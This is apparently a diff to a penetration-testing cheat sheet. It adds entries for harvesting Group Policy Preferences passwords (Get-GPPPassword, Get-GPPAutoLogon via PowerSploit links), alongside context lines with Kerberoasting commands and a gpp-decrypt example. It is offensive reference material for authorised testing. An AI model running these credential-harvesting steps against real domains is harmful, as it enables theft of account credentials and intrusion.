@@ -2305,11 +2305,24 @@ $ python GetUserSPNs.py -dc-ip <Domain Controller IP address> <domain>/<username
 $ python GetUserSPNs.py -request -target-domain <domain> <domain>/<username>
 ```
 
+- Get-GPPPassword
+
+```
+PS C:\> ls \\<Domain Controller>\SYSVOL\<Domain>\scripts
+https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1
+```
+
 - GPPDecrypt
 
 ```
 C:\> gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
 https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN
+```
+
+- Get-GPPAutoLogon
+
+```
+https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPAutologon.ps1
 ```
 
 #8. - File Transfers
